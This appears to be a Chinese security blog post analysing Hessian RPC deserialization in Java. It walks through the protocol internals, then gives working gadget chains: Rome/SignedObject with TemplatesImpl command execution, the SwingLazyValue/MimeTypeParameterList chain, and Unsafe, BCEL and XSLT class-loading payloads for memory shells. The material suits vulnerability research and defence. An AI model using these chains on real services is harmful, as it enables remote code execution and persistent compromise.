+++
title = "Hessian Deserialization"
author = ["4shen0ne"]
publishDate = 2024-12-18T00:00:00+08:00
tags = ["hessian", "deserialize"]
draft = false
+++

Hessian 是一个二进制 Web 协议的实现，由 caucho 公司主导开发，其目的是实现一个轻量级、跨语言、自描述（不依赖外部定义）的二进制通信协议

<!--more-->


## Hello Hessian {#hello-hessian}

Hessian 基于 HTTP 进行数据传输，一般会像常规的 Web 服务一样提供一个 API 被客户端调用。以 Servlet 项目为例，和常规 Web 服务一样绑定路由，通过 Tomcat 部署


### 示例：Servlet {#示例-servlet}

和普通的 Servlet 配置差不多，但是需要继承 HessianServlet

<a id="code-snippet--hello"></a>
```java
public class Hello extends HessianServlet implements Greeting {
    @Override
    public String sayHello(String name) {
        return "Hello, " + name;
    }
}
```

```xml
<web-app>
    <servlet>
        <servlet-name>greeting</servlet-name>
        <servlet-class>org.example.Hello</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>greeting</servlet-name>
        <url-pattern>/hello</url-pattern>
    </servlet-mapping>
</web-app>
```
<div class="src-block-caption">
  <span class="src-block-number">Code Snippet 1:</span>
  web.xml
</div>

打包成 war 之后直接用 tomcat 部署即可

```shell
docker run -it --rm \
  -e 'JPDA_ADDRESS=*:8000' \
  -e JPDA_TRANSPORT=dt_socket \
  -p 8888:8080 \
  -p 9000:8000 \
  -v ./hessian.war:/usr/local/tomcat/webapps/hessian.war \
  tomcat:9.0 \
  /usr/local/tomcat/bin/catalina.sh jpda run
```

客户端使用 Hessian 的工厂类构建一个动态代理对象，实现对远程对象的方法调用

<a id="code-snippet--client"></a>
```java
public class Client {
    public static void main(String[] args) throws MalformedURLException, ClassNotFoundException {
        String url = "http://localhost:8888/hessian/hello";

        HessianProxyFactory factory = new HessianProxyFactory();
        Greeting greeting = (Greeting) factory.create(Greeting.class, url);

        System.out.println("Hessian server say: " + greeting.sayHello("client"));
    }
}
```
<div class="src-block-caption">
  <span class="src-block-number"><a href="#code-snippet--client">Code Snippet 2</a>:</span>
  Hessian Client
</div>

Hessian 通常是基于 HTTP 协议进行数据传输的，使用的是 POST 方法

{{< figure src="/ox-hugo/_20241210_104811screenshot.png" >}}

```hexdump
63 02 00 6d 00 08 73 61 79 48 65 6c 6c 6f 53 00 06 63 6c 69 65 6e 74 7a
c..m..sayHelloS..clientz
```


### 示例：SpringBoot {#示例-springboot}

在 SpringBoot 中可以用 `org.springframework.remoting.caucho.HessianServiceExporter` 来注册服务，注意
remoting 模块在最新版本中默认是不提供的，建议使用低版本进行测试

通过注解进行配置还是比较简单的，demo 代码可以参考[这里](https://github.com/eugenp/tutorials/tree/master/spring-remoting-modules/remoting-hessian-burlap)

```java
@Configuration
@ComponentScan
@EnableAutoConfiguration
public class Application {
    @Autowired
    private Hello greeting;  // 注意给 Hello 类添加 @Service 注解

    public static void main(String[] args) {
        SpringApplication.run(Application.class, args);
    }

    @Bean(name = "/hello")
    public RemoteExporter helloService() {
        HessianServiceExporter exporter = new HessianServiceExporter();
        exporter.setService(greeting);
        exporter.setServiceInterface(Greeting.class);
        return exporter;
    }
}
```

Client 代码和前文一样，访问 `:8080/hello` 即可调用 Hessian 服务


## 远程调用过程 {#远程调用过程}


### HessianServlet {#hessianservlet}

HessianServlet 是 HTTPServlet 的子类，所以我们重点关注两个方法：

1.  init：负责初始化 Servlet 对象
2.  service：负责处理和响应 HTTP 请求

在 init 方法中，主要是初始化一些成员变量，比如我们定义的 [Hello](#code-snippet--hello) 对象和它的类型信息；还有 skeleton 对象，用来处理来自客户端的数据，完成远程方法调用

{{< figure src="/ox-hugo/_20241210_113710screenshot.png" >}}

service 方法是整个 RPC 处理过程的入口点，我们从这里开始探索 Hessian 的服务调用实现逻辑

1.  首先会检查是不是 POST 请求，如果不是的话会直接返回 500 错误码
2.  接着用 ServiceContext 类保存一些上下文对象（request、response 等等）
3.  初始化序列化工厂对象 SerializerFactory
4.  再进入 `com.caucho.hessian.server.HessianSkeleton#invoke(InputStream, OutputStream,
       SerializerFactory)` 方法


### HessianSkeleton {#hessianskeleton}

HessianSkeleton 是 AbstractSkeleton 的子类，其功能类似于动态代理，将实际的服务对象进行封装，提供给客户端调用，在调用过程中就涉及到二进制数据的序列化和反序列化

AbstractSkeleton 初始化时会从服务对象的接口（类）中获取所有方法并保存在 `_methodMap` 中

```java
protected AbstractSkeleton(Class apiClass)
{
  _apiClass = apiClass;

  Method []methodList = apiClass.getMethods();

  for (int i = 0; i < methodList.length; i++) {
    Method method = methodList[i];

    if (_methodMap.get(method.getName()) == null)
      _methodMap.put(method.getName(), methodList[i]);

    Class []param = method.getParameterTypes();
    String mangledName = method.getName() + "__" + param.length;
    _methodMap.put(mangledName, methodList[i]);

    _methodMap.put(mangleName(method, false), methodList[i]);
  }
}
```

每个方法会在 `_methodMap` 中生成三组键值对，key 分别为：

```text
1. 方法名
2. 方法名__参数个数
3. 方法名_参数1类型_参数2类型
```

服务对象则保存在私有属性 `HessianSkeleton#_service` 中

客户端调用服务时调用 `HessianSkeleton#invoke` ，会读取二进制数据的头部判断协议的版本，比如前文的数据以 `63 02` 开头，服务端则会用 HessianInput 进行反序列化，然后用 Hessian2Output 对返回数据进行序列化（CALL_1_REPLY_2）

```java
public HeaderType readHeader(InputStream is)
  throws IOException
{
  int code = is.read();

  int major = is.read();
  int minor = is.read();

  switch (code) {
  case -1:
    throw new IOException("Unexpected end of file for Hessian message");

  case 'c':
    if (major >= 2)
      return HeaderType.CALL_1_REPLY_2;
    else
      return HeaderType.CALL_1_REPLY_1;
  case 'r':
    return HeaderType.REPLY_1;

  case 'H':
    return HeaderType.HESSIAN_2;

  default:
    throw new IOException((char) code + " 0x" + Integer.toHexString(code) + " is an unknown Hessian message code.");
  }
}
```
<div class="src-block-caption">
  <span class="src-block-number">Code Snippet 3:</span>
  com.caucho.hessian.io.HessianInputFactory#readHeader
</div>

```java
switch (header) {
case CALL_1_REPLY_1:
  in = _hessianFactory.createHessianInput(is);
  out = _hessianFactory.createHessianOutput(os);
  break;

case CALL_1_REPLY_2:
  in = _hessianFactory.createHessianInput(is);
  out = _hessianFactory.createHessian2Output(os);
  break;

case HESSIAN_2:
  in = _hessianFactory.createHessian2Input(is);
  in.readCall();
  out = _hessianFactory.createHessian2Output(os);
  break;

default:
  throw new IllegalStateException(header + " is an unknown Hessian call");
}
```
<div class="src-block-caption">
  <span class="src-block-number">Code Snippet 4:</span>
  com.caucho.hessian.server.HessianSkeleton#invoke
</div>

设置好输入输出流之后，根据前文提到的 `_methodMap` 找到要执行的方法，通过 `HessianSkeleton#_service` 进行反射调用，再将调用结果返回给客户端

{{< figure src="/ox-hugo/_20241210_160147screenshot.png" >}}


### 协议版本 {#协议版本}

我们现在知道，即使 Hessian 协议已经迭代到 2.0 版本，仍然可以和 1.0 版本混用，默认情况下使用
CALL_1_REPLY_2，即客户端发送 1.0 协议数据，服务端返回 2.0 协议数据

{{< figure src="/ox-hugo/_20241212_152518screenshot.png" >}}

想要客户端发送 2.0 协议数据需要显式设置

```java
HessianProxyFactory factory = new HessianProxyFactory();
factory.setHessian2Request(true);
```


## 序列化过程 {#序列化过程}

Hessian 定义了 AbstractHessianInput/AbstractHessianOutput 两个抽象类，用来提供序列化数据的读取和写入功能。从前文我们可以知道，根据协议版本不同，提供了 Hessian/Hessian2/Burlap 等几种不同的具体实现

我们先通过 [Client](#code-snippet--client) 示例简单看看序列化的过程

首先要使用 HessianProxyFactory 来创建一个动态代理对象来代理远程的服务对象，当调用任意方法时实际执行的是 `com.caucho.hessian.client.HessianProxy#invoke` ，发送请求时通过 `HessianOutput#writeObject` 来写入序列化数据

```text
writeObject:315, HessianOutput (com.caucho.hessian.io)
call:132, HessianOutput (com.caucho.hessian.io)
sendRequest:293, HessianProxy (com.caucho.hessian.client)
invoke:171, HessianProxy (com.caucho.hessian.client)
sayHello:-1, $Proxy0 (com.sun.proxy)
main:13, Client
```

根据不同的序列化数据类型，会从工厂类中获取对应的序列化器实现，通常是 BasicSerializer 实现

```java
public void writeObject(Object object)
  throws IOException
{
  if (object == null) {
    writeNull();
    return;
  }

  Serializer serializer;

  serializer = _serializerFactory.getSerializer(object.getClass());

  serializer.writeObject(object, this);
}
```
<div class="src-block-caption">
  <span class="src-block-number">Code Snippet 5:</span>
  com.caucho.hessian.io.HessianOutput#writeObject
</div>

<details>
<summary><code>ContextSerializerFactory#_serializerClassMap</code></summary>
<div class="details">

{{< figure src="/ox-hugo/_20241210_174729screenshot.png" >}}
</div>
</details>

在开始进行数据序列化时，会调用 `com.caucho.hessian.io.AbstractHessianOutput#writeObjectBegin` ，在 1.0
版本时会把所有数据都写在一个 Map 容器里面，Hessian2Output 则重写了该方法，根据类型写入其描述信息

```java
/**
 * Writes the object header to the stream (for Hessian 2.0), or a
 * Map for Hessian 1.0.  Object writers will call
 * ...
 */
public int writeObjectBegin(String type)
  throws IOException
{
  writeMapBegin(type);
  return -2;
}
```


### Serializable 和 transient {#serializable-和-transient}

逐步调试 `HessianOutput#writeObject` 的过程中，我们可以注意到两个比较关键的判断逻辑。在工厂类获取序列化器时，会判断目标类有没有实现 Serializable 接口，这很合理，但条件是这样的：

```java
if (! Serializable.class.isAssignableFrom(cl)
    && ! _isAllowNonSerializable) {
  throw new IllegalStateException("Serialized class " + cl.getName() + " must implement java.io.Serializable");
}
```

也就是还有一个 `_isAllowNonSerializable` 属性可以让没有实现 Serializable 接口的类进行序列化

继续调试，工厂类默认获取的序列化器是 UnsafeSerializer，它会跳过所有被 transient 和 static 修饰的成员变量

```java
if (Modifier.isTransient(field.getModifiers())
    || Modifier.isStatic(field.getModifiers())) {
  continue;
}
```
<div class="src-block-caption">
  <span class="src-block-number">Code Snippet 6:</span>
  com.caucho.hessian.io.UnsafeSerializer#introspect
</div>


## 反序列化过程 {#反序列化过程}

反序列化过程和 AbstractHessianInput 的子类密切相关，入口方法和原生反序列化一样（名字一样）都是
readObject，以 HessianInput 为例，在 readObject 方法中会根据 tag 判断数据的类型，然后使用对应的
Deserializer 去处理。由于 Hessian1.0 会把序列化数据都放在一个 Map 中，所以会像下图一样通过 readMap
处理：

{{< figure src="/ox-hugo/_20241211_155749screenshot.png" >}}

在 readMap 中会将数据进行反序列化，然后将对象放到 HashMap 或者 TreeMap 的键值对里

```java
public Object readMap(AbstractHessianInput in)
  throws IOException
{
  Map map;

  if (_type == null)
    map = new HashMap();
  else if (_type.equals(Map.class))
    map = new HashMap();
  else if (_type.equals(SortedMap.class))
    map = new TreeMap();
  else {
    try {
      map = (Map) _ctor.newInstance();
    } catch (Exception e) {
      throw new IOExceptionWrapper(e);
    }
  }

  in.addRef(map);

  while (! in.isEnd()) {
    map.put(in.readObject(), in.readObject());
  }

  in.readEnd();

  return map;
}
```

看到这里我们应该意识到 Hessian 反序列化漏洞的入口在哪了，虽然在反序列过程中不会像原生反序列化一样触发 readObject 方法，也不会像 FastJSON 一样调用 getter/setter，但这个 readMap 方法中的 `map.put` 操作成了漏网之鱼

众所周知，HashMap 在执行 put 操作时会调用 key 的 hashCode 和 equals 方法，这在很多现有的链中被利用到；而 TreeMap 在执行 put 操作时也会调用 key 的 compareTo 方法

如果是 Hessian2.0 的序列化数据，数据流的 tag 是 `C` ，最后会根据类型描述信息由
`sun.misc.Unsafe#allocateInstance` 方法进行反序列化对象的初始化，这个方法是一个 native 方法，没有办法进行利用

```text
instantiate:306, UnsafeDeserializer (com.caucho.hessian.io)
readObject:148, UnsafeDeserializer (com.caucho.hessian.io)
readObjectInstance:2219, Hessian2Input (com.caucho.hessian.io)
readObject:2140, Hessian2Input (com.caucho.hessian.io)
readObject:2124, Hessian2Input (com.caucho.hessian.io)
readObject:1677, Hessian2Input (com.caucho.hessian.io)
invoke:296, HessianSkeleton (com.caucho.hessian.server)
invoke:198, HessianSkeleton (com.caucho.hessian.server)
invoke:399, HessianServlet (com.caucho.hessian.server)
service:379, HessianServlet (com.caucho.hessian.server)
```


## 利用链分析 {#利用链分析}

根据以上反序列化过程的分析，我们可以总结出 Hessian 的利用链的特征：

1.  入口方法是 hashCode/equals/compareTo 其中之一
2.  利用类可以不实现 Serializable 接口，但是 transient 成员变量不能利用
3.  利用类的 readObject 不会自动触发，除非在利用链上显式调用（二次反序列化）


### Rome {#rome}

Rome 是一个用于 RSS 和 Atom 订阅的 Java 框架，在 marshalsec 中就用它的 ToStringBean 和 EqualsBean
等类构造出了 Hessian 利用链

EqualsBean 在 hashCode 中可以执行任意对象的 toString 方法

```java
public class EqualsBean implements Serializable {
    public int hashCode() {
        return beanHashCode();
    }
    // ...
    public int beanHashCode() {
        return obj.toString().hashCode();
    }
}
```

而 `ToStringBean#toString` 可以调用他封装类的全部无参 getter 方法，那么可以用
`JdbcRowSetImpl#getDatabaseMetaData` 进行 JNDI 注入

{{< figure src="/ox-hugo/_20241211_162700screenshot.png" >}}

在不出网的情况下还可以利用 `java.security.SignedObject#getObject` 触发原生反序列化链（二次反序列化）

{{< figure src="/ox-hugo/_20241211_162929screenshot.png" >}}

```text
getObject:179, SignedObject (java.security)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:497, Method (java.lang.reflect)
toString:158, ToStringBean (com.rometools.rome.feed.impl)
toString:129, ToStringBean (com.rometools.rome.feed.impl)
beanHashCode:198, EqualsBean (com.rometools.rome.feed.impl)
hashCode:180, EqualsBean (com.rometools.rome.feed.impl)
hash:338, HashMap (java.util)
put:611, HashMap (java.util)
readMap:114, MapDeserializer (com.caucho.hessian.io)
readMap:538, SerializerFactory (com.caucho.hessian.io)
readObject:1160, HessianInput (com.caucho.hessian.io)
```
<div class="src-block-caption">
  <span class="src-block-number">Code Snippet 1:</span>
  SignedObject 链调用栈
</div>

<details>
<summary>利用 TemplatesImpl 原生反序列化利用链执行命令</summary>
<div class="details">

```java
public class SignedObjectGadget {
    public static void main(String[] args) throws Exception {
        byte[] code = getTemplates();
        byte[][] codes = {code};
        TemplatesImpl templates = new TemplatesImpl();
        setValue(templates, "_tfactory", new TransformerFactoryImpl());
        setValue(templates, "_name", "Aiwin");
        setValue(templates, "_class", null);
        setValue(templates, "_bytecodes", codes);
        ToStringBean toStringBean = new ToStringBean(Templates.class, templates);
        EqualsBean equalsBean = new EqualsBean(String.class, "aiwin");
        HashMap hashMap = new HashMap();
        hashMap.put(equalsBean, "aaa");
        setValue(equalsBean, "beanClass", ToStringBean.class);
        setValue(equalsBean, "obj", toStringBean);

        //SignedObject
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject(hashMap, kp.getPrivate(), Signature.getInstance("DSA"));
        ToStringBean toStringBean_sign = new ToStringBean(SignedObject.class, signedObject);
        EqualsBean equalsBean_sign = new EqualsBean(String.class, "aiwin");
        HashMap hashMap_sign = new HashMap();
        hashMap_sign.put(equalsBean_sign, "aaa");
        setValue(equalsBean_sign, "beanClass", ToStringBean.class);
        setValue(equalsBean_sign, "obj", toStringBean_sign);
        String result = Hessian_serialize(hashMap_sign);
        Hessian_unserialize(result);
    }

    public static void setValue(Object obj, String name, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static byte[] getTemplates() throws IOException, CannotCompileException, NotFoundException {
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass("Test");
        ctClass.setSuperclass(classPool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        String block = "Runtime.getRuntime().exec(\"kcalc\");";
        ctClass.makeClassInitializer().insertBefore(block);
        return ctClass.toBytecode();
    }

    public static String Hessian_serialize(Object object) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        HessianOutput hessianOutput = new HessianOutput(byteArrayOutputStream);
        hessianOutput.writeObject(object);
        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
    }

    public static void Hessian_unserialize(String obj) throws IOException {
        byte[] code = Base64.getDecoder().decode(obj);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(code);
        HessianInput hessianInput = new HessianInput(byteArrayInputStream);
        hessianInput.readObject();
    }
}
```
</div>
</details>

{{< figure src="/ox-hugo/_20241211_175539screenshot.png" >}}


### Swing {#swing}

这是一条 JDK 原生的反序列化链，这条链的 sink 点在 `sun.swing.SwingLazyValue#createValue` 方法中

<a id="code-snippet--SwingLazyValue"></a>
```java { hl_lines=["4","7","10"] }
public Object createValue(UIDefaults var1) {
    try {
        ReflectUtil.checkPackageAccess(this.className);
        Class var2 = Class.forName(this.className, true, (ClassLoader)null);
        if (this.methodName != null) {
            Class[] var6 = this.getClassArray(this.args);
            Method var7 = var2.getMethod(this.methodName, var6);
            this.makeAccessible(var7);
            // 注意 var2 是一个 Class 对象，所以我们只能利用类方法
            return var7.invoke(var2, this.args);
        } else {
            Class[] var3 = this.getClassArray(this.args);
            Constructor var4 = var2.getConstructor(var3);
            this.makeAccessible(var4);
            return var4.newInstance(this.args);
        }
    } catch (Exception var5) {
        return null;
    }
}
```

这个方法有两个利用点，我们可以通过指定 methodName 来反射调用任意方法，也可以将 methodName 置空来触发一个类的初始化操作。其实这个类在 Xstream 的 [CVE-2021-21346](https://x-stream.github.io/CVE-2021-21346.html) 就被利用过，当时的 gadget 为：

```text
Rdn$RdnEntry#compareTo->
  XString#equal->
    MultiUIDefaults#toString->
      UIDefaults#get->
        UIDefaults#getFromHashTable->
          UIDefaults$LazyValue#createValue->
            SwingLazyValue#createValue->
              InitialContext#doLookup()
```

由于 MultiUIDefaults 不是 public 类，这个 gadget 无法复用到 Hessian 中，我们还需要找到一个入口触发
`UIDefaults#get`

找到代替品 `javax.activation.MimeTypeParameterList#toString` ，它会执行 parameters 成员变量的 get 方法

```java
public String toString() {
    StringBuffer buffer = new StringBuffer();
    buffer.ensureCapacity(this.parameters.size() * 16);
    Enumeration keys = this.parameters.keys();

    while(keys.hasMoreElements()) {
        String key = (String)keys.nextElement();
        buffer.append("; ");
        buffer.append(key);
        buffer.append('=');
        buffer.append(quote((String)this.parameters.get(key)));
    }

    return buffer.toString();
}
```

至于 toString 方法，可以利用 `Hessian2Input#expect` 触发，这是一个用来打印类型错误信息的方法，Hessian
在反序列化时需要从数据流读取标志字节（tag）来判断接下来的数据是什么类型，以此来保证使用正确的方法还原对象，比如之前我们看到过 M 代表 Map 类型的对象，会调用 readMap 方法处理

当读取到的 tag 和预期不符时，会调用 `Hessian2Input#expect` 来输出错误信息，这时会将剩下的数据用
readObject 方法进行反序列化，然后和字符串拼接生成错误信息，这时候会隐式执行对象的 toString 方法

```java
Object obj = readObject();
if (obj != null) {
  return error("expected " + expect
               + " at 0x" + Integer.toHexString(ch & 0xff)
               + " " + obj.getClass().getName() + " (" + obj + ")"
               + "\n  " + context + "");
```

那么怎么触发 `Hessian2Input#expect` 呢？经过调试可以发现，在反序列化 MimeTypeParameterList 或者其他自定义对象时，会调用 readObjectDefinition 获取类名信息，这时就会使用 readString 来获取类名字符串

{{< figure src="/ox-hugo/_20241213_153000screenshot.png" >}}

{{< figure src="/ox-hugo/_20241213_153054screenshot.png" >}}

很容易想到，我们在序列化数据中，将开头代表自定义类型的标志 C 多写入一个，那么在 readString 方法中读取到的仍然是完整的 MimeTypeParameterList 对象，这时候就会因为 tag 不是代表字符串而进入 expect 方法，将 MimeTypeParameterList 反序列化，并触发它的 toString 方法

```java
ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
Hessian2Output out = new Hessian2Output(byteArrayOutputStream);
out.getSerializerFactory().setAllowNonSerializable(true);
out.writeObject(object);
out.flushBuffer();

byte[] origin = byteArrayOutputStream.toByteArray();
byte[] payload = new byte[origin.length + 1];
System.arraycopy(new byte[]{'C'}, 0, payload, 0, 1);
System.arraycopy(origin, 0, payload, 1, origin.length);
```
<div class="src-block-caption">
  <span class="src-block-number">Code Snippet 7:</span>
  在序列化数据开头添加 C (byte)
</div>

```text
exec:347, Runtime (java.lang)
...
invoke:275, MethodUtil (sun.reflect.misc)
...
invoke:497, Method (java.lang.reflect) [1]
createValue:73, SwingLazyValue (sun.swing)
getFromHashtable:216, UIDefaults (javax.swing)
get:161, UIDefaults (javax.swing)
toString:253, MimeTypeParameterList (javax.activation)
valueOf:2994, String (java.lang)
append:131, StringBuilder (java.lang)
expect:2880, Hessian2Input (com.caucho.hessian.io)
readString:1398, Hessian2Input (com.caucho.hessian.io)
readObjectDefinition:2180, Hessian2Input (com.caucho.hessian.io)
readObject:2122, Hessian2Input (com.caucho.hessian.io)
```
<div class="src-block-caption">
  <span class="src-block-number">Code Snippet 2:</span>
  调用栈
</div>


#### 不出网利用 {#不出网利用}

通过反射调用任意方法可以做到 RCE，但在无法出网的情境下，单纯的 RCE 也难以有效利用。如果可以借助
[`SwingLazyValue#createValue`](#code-snippet--SwingLazyValue) 初始化任意类，那么就可以写入内存马

<!--list-separator-->

-  1. Unsafe

    `sun.misc.Unsafe#defineClass` 可以通过字节数组动态定义一个类， `SwingLazyValue#createValue` 又可以利用来加载和初始化一个类，结合两者我们就能够实现任意类初始化，以此执行任意代码

    整个利用过程需要触发两次反序列化漏洞，第一次通过反射调用 defineClass 定义任意类，假设为 Exploit

    ```java
    Method invoke = MethodUtil.class.getMethod("invoke", Method.class, Object.class, Object[].class);
    Method defineClass = Unsafe.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class, ClassLoader.class, ProtectionDomain.class);
    Field f = Unsafe.class.getDeclaredField("theUnsafe");
    f.setAccessible(true);
    Object unsafe = f.get(null);
    Object[] args = new Object[]{invoke, new Object(), new Object[]{defineClass, unsafe, new Object[]{"exp", payload, 0, payload.length, null, null}}};  // payload 为 Exploit 类字节数组
    SwingLazyValue swingLazyValue = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", args);
    ```

    成功定义 Exploit 类后加载并初始化，需要将 methodName 设置为 null

    ```java
    SwingLazyValue swingLazyValue = new SwingLazyValue("Exploit", null, new Object[0]);
    ```

<!--list-separator-->

-  2. BCEL

    BCEL（Byte Code Engineering Library）是一个由 Apache Commons 提供的库，用于分析、创建和修改 Java 字节码，而 `com.sun.org.apache.bcel.internal.util.JavaWrapper#_main` 可以从 BCEL 格式的对象字符串中动态构建对象

    ```java
    SwingLazyValue slz = new SwingLazyValue("com.sun.org.apache.bcel.internal.util.JavaWrapper", "_main", new Object[]{new String[]{payload}});  // payload 是恶意类的 BCEL 字符串
    ```

    <details>
    <summary>调用栈</summary>
    <div class="details">

    ```text
    _main:153, JavaWrapper (com.sun.org.apache.bcel.internal.util)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:497, Method (java.lang.reflect)
    createValue:73, SwingLazyValue (sun.swing)
    getFromHashtable:216, UIDefaults (javax.swing)
    get:161, UIDefaults (javax.swing)
    toString:253, MimeTypeParameterList (javax.activation)
    valueOf:2994, String (java.lang)
    append:131, StringBuilder (java.lang)
    expect:2880, Hessian2Input (com.caucho.hessian.io)
    readString:1398, Hessian2Input (com.caucho.hessian.io)
    readObjectDefinition:2180, Hessian2Input (com.caucho.hessian.io)
    readObject:2122, Hessian2Input (com.caucho.hessian.io)
    ```
    </div>
    </details>

<!--list-separator-->

-  3. XSLT

    XSLT 是一种样式转换标记语言，可以将 XML 文档转换成其他格式，比如 HTML。XSLT 包含了超过 100 个内置函数, 这些函数可以用于字符串、数值、日期和时间比较、节点和 QName 处理, 序列处理, 逻辑判断等等

    我们可以将 XSLT 想象成模板引擎，在利用 SSTI 时我们通常需要用模板语言定义多个中间变量去构造完整的
    payload，XSLT 也提供了定义变量的元素 variable

    ```xml
    <xsl:variable
    name="name"
    select="expression">
      <!-- Content:template -->
    </xsl:variable>
    ```

    其中 select 属性是一个表达式，可以灵活地通过各种功能函数去获取变量的值，如果没有控制好边界，攻击者可以通过 select 属性直接调用底层语言的方法/函数。比如：

    ```java
    <?xml version="1.0" encoding="utf-8"?>
    <xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
    xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
        <xsl:template match="/">
        <xsl:variable name="rtobject" select="rt:getRuntime()"/>
        <xsl:variable name="process" select="rt:exec($rtobject,'ls')"/>
        <xsl:variable name="processString" select="ob:toString($process)"/>
        <xsl:value-of select="$processString"/>
        </xsl:template>
    </xsl:stylesheet>
    ```
    <div class="src-block-caption">
      <span class="src-block-number">Code Snippet 8:</span>
      CVE-2024-36522
    </div>

    在进行反序列化黑名单绕过时（比如 NacOS），也常常通过 XSLT 绕过黑名单实现任意类加载（因为特征在字符串中，可以搭配各种编码混淆），从而写入内存马

    ```xml
    <xsl:stylesheet version="1.0"
                    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                    xmlns:b64="http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder"
                    xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object"
                    xmlns:th="http://xml.apache.org/xalan/java/java.lang.Thread"
                    xmlns:ru="http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils">
      <xsl:template match="/">
        <xsl:variable name="bs" select="b64:decodeBuffer(b64:new(),'<class_bytes_b64>')"/>
        <xsl:variable name="cl" select="th:getContextClassLoader(th:currentThread())"/>
        <xsl:variable name="rce" select="ru:defineClass('<class_name>',$bs,$cl)"/>
        <xsl:value-of select="$rce"/>
      </xsl:template>
    </xsl:stylesheet>
    ```

    结合 [`SwingLazyValue#createValue`](#code-snippet--SwingLazyValue) 的反射调用利用点，可以使用
    `com.sun.org.apache.xalan.internal.xslt.Process#_main` 加载执行恶意 XSLT 代码，但是需要通过文件路径来加载，所以需要先写到文件中

    {{< figure src="/ox-hugo/_20241217_162115screenshot.png" >}}

    1.  将恶意 XSLT 代码写入文件

    <!--listend-->

    ```java
    String evilXslt = "<恶意XSLT代码，比如上文的命令执行>";
    SwingLazyValue value1 = new SwingLazyValue("com.sun.org.apache.xml.internal.security.utils.JavaUtils", "writeBytesToFilename", new Object[]{"/tmp/xslt_data", evilXslt.getBytes()});
    ```

    1.  加载解析 XSLT，触发命令执行

    <!--listend-->

    ```java
    SwingLazyValue value2 = new SwingLazyValue("com.sun.org.apache.xalan.internal.xslt.Process", "_main", new Object[]{new String[]{"-XT", "-XSL", "file:///tmp/xslt_data"}});
    ```


## References {#references}

-   <https://su18.org/post/hessian/>
-   <https://yzddmr6.com/posts/swinglazyvalue-in-webshell/>
